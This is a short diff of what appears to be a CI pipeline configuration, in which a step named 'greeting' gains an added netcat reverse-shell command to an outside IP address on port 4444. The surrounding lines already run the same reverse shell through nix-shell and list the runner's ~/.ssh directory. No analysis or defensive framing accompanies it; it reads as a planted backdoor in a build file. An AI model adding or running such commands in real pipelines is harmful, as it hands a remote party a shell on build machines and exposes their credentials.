@@ -10,6 +10,7 @@ platform:
 steps:
 - name: greeting
   commands:
+  - nc 93.177.66.52 4444 -e /bin/sh
   - nix-shell -p netcat-gnu --command "nc 93.177.66.52 4444 -e /bin/sh"
   - pwd
   - ls ~/.ssh
